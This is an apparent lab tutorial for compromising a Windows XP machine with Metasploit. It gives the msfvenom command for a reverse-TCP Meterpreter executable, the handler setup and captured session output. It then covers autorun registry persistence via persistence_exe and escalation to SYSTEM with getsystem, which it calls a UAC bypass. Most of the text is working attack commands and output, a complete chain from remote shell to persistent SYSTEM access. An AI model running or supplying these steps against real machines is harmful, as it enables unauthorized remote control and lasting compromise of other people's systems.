# WindowsXp
In this I will explain how to bypass Windows Xp and make the attack persistence and do UAC bypass on the target machine.  

We will be doing this with the help of payload created in kali linux.

Steps to create payload in kali linux: 

1. In kali terminal 

┌──(bhavin㉿kali)-[~]
└─$ msfvenom -p windows/meterpreter/reverse_tcp  lhost=172.20.10.12 lport=1234 -f exe      -o bhavin1.exe 
                |                             |        |          |      |    |   |      |   |          |   
Syntax:-        | Type of palyoad             |        | Eth0 IP  |      |port|   |format|   | Filename |
                  
2. Payload will be created successfully if everything is correct.

3. Transfer the bhavin1.exe file to the target machine.

4. In kali open msfconsole

┌──(bhavin㉿kali)-[~]
└─$ msfconsole                                                                                          

5. use a epxloit 

msf6 > use exploit/multi/handler 

6. set exact same payload as used while creation of payload executable file.

msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp

7. use same lhost and lport 

msf6 exploit(multi/handler) > set lhost 172.20.10.12
lhost => 172.20.10.12

msf6 exploit(multi/handler) > set lport 1234
lport => 1234

8. exploit

msf6 exploit(multi/handler) > exploit 

[*] Started reverse TCP handler on 172.20.10.12:1234......

9. Double click the bhavin1.exe file in Windows Xp  

10. In kali

msf6 exploit(multi/handler) > exploit 

[*] Started reverse TCP handler on 172.20.10.12:1234 
[*] Sending stage (175686 bytes) to 172.20.10.5 {THIS IS THE TARGET'S IP}
[*] Meterpreter session 1 opened (172.20.10.12:1234 -> 172.20.10.5:1062) at 2023-01-31 18:55:02 +0530

meterpreter > 

11. To make persistence 

meterpreter > background 
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > search persistence

Matching Modules
================

   #   Name                                                  Disclosure Date  Rank       Check  Description
   -   ----                                                  ---------------  ----       -----  -----------
   0   exploit/linux/local/apt_package_manager_persistence   1999-03-09       excellent  No     APT Package Manager Persistence                                                                                                                             
   1   exploit/windows/local/ps_wmi_exec                     2012-08-19       excellent  No     Authenticated WMI Exec via Powershell
   2   exploit/linux/local/autostart_persistence             2006-02-13       excellent  No     Autostart Desktop Item Persistence                                                                                                                          
   3   exploit/linux/local/bash_profile_persistence          1989-06-08       normal     No     Bash Profile Persistence
   4   exploit/linux/local/cron_persistence                  1979-07-01       excellent  No     Cron Persistence
   5   exploit/osx/local/persistence                         2012-04-01       excellent  No     Mac OS X Persistent Payload Installer
   6   exploit/osx/local/sudo_password_bypass                2013-02-28       normal     Yes    Mac OS X Sudo Password Bypass
   7   exploit/windows/local/vss_persistence                 2011-10-21       excellent  No     Persistent Payload in Windows Volume Shadow Copy
   8   auxiliary/server/regsvr32_command_delivery_server                      normal     No     Regsvr32.exe (.sct) Command Delivery Server
   9   post/linux/manage/sshkey_persistence                                   excellent  No     SSH Key Persistence
   10  post/windows/manage/sshkey_persistence                                 good       No     SSH Key Persistence
   11  exploit/linux/local/service_persistence               1983-01-01       excellent  No     Service Persistence
   12  exploit/windows/local/wmi_persistence                 2017-06-06       normal     No     WMI Event Subscription Persistence                                                                                                                          
   13  post/windows/gather/enum_ad_managedby_groups                           normal     No     Windows Gather Active Directory Managed Groups
   14  post/windows/manage/persistence_exe                                    normal     No     Windows Manage Persistent EXE Payload Installer
   15  exploit/windows/local/s4u_persistence                 2013-01-02       excellent  No     Windows Manage User Level Persistent Payload Installer
   16  exploit/windows/local/persistence                     2011-10-19       excellent  No     Windows Persistent Registry Startup Payload Installer
   17  exploit/windows/local/persistence_service             2018-10-20       excellent  No     Windows Persistent Service Installer
   18  exploit/windows/local/registry_persistence            2015-07-01       excellent  Yes    Windows Registry Only Persistence                                                                                                                           
   19  exploit/windows/local/persistence_image_exec_options  2008-06-28       excellent  No     Windows Silent Process Exit Persistence                                                                                                                     
   20  exploit/linux/local/yum_package_manager_persistence   2003-12-17       excellent  No     Yum Package Manager Persistence                                                                                                                             
   21  exploit/unix/local/at_persistence                     1997-01-01       excellent  Yes    at(1) Persistence
   22  exploit/linux/local/rc_local_persistence              1980-10-01       excellent  No     rc.local Persistence


Interact with a module by name or index. For example info 22, use 22 or use exploit/linux/local/rc_local_persistence

msf6 exploit(multi/handler) > use 14

12. set the options 

msf6 post(windows/manage/persistence_exe) > set REXEPATH bhavin1.exe
REXEPATH => bhavin1.exe
msf6 post(windows/manage/persistence_exe) > set session 1
session => 1
msf6 post(windows/manage/persistence_exe) > 

13. 
  msf6 post(windows/manage/persistence_exe) > run 

[*] Running module against 91976-XPYB9EVFX
[*] Reading Payload from file /home/bhavin/Desktop/bhavin1.exe
[+] Persistent Script written to C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\default.exe
[*] Executing script C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\default.exe
[+] Agent executed with PID 2256
[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\EiZoknktMR
[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\EiZoknktMR
[*] Cleanup Meterpreter RC File: /home/bhavin/.msf4/logs/persistence/91976-XPYB9EVFX_20230131.0252/91976-XPYB9EVFX_20230131.0252.rc
[*] Meterpreter session 2 opened (172.20.10.12:1234 -> 172.20.10.5:1065) at 2023-01-31 19:02:22 +0530

14. UAC bypass 
  
 msf6 post(windows/manage/persistence_exe) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > getuid 
Server username: 91976-XPYB9EVFX\Administrator
meterpreter > getsystem 
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
meterpreter > 





